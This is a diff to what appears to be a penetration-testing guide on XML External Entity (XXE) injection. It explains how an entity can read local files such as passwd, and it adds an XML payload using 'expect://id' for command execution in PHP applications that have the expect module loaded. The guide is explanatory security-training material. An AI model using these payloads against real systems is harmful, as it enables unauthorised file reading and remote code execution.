@@ -44,8 +44,6 @@ Example of valid XML:
 
 * Whitespace is perserved in XML
 
-
-
 ### Attack
 
 So if an application receives XML to the server the attacker might be able to exploit an XXE. An attack might look like this:
@@ -58,6 +56,20 @@ So if an application receives XML to the server the attacker might be able to ex
 ```
 
 The elemet can be whatever, it doesn't matter. The xxe is the "variable" where the content of /dev/random get stored. And by dereferencing it in the foo-tag the content gets outputted.This way an attacker might be able to read files from the local system, like boot.ini or passwd.
+
+
+
+In php-applications where the expect module is loaded it is possible to get RCE. It is not a very common vulnerability, but still good to know.
+
+```
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [ <!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "expect://id" >]>
+<creds>
+    <user>&xxe;</user>
+    <pass>mypass</pass>
+</creds>
+```
 
 
 
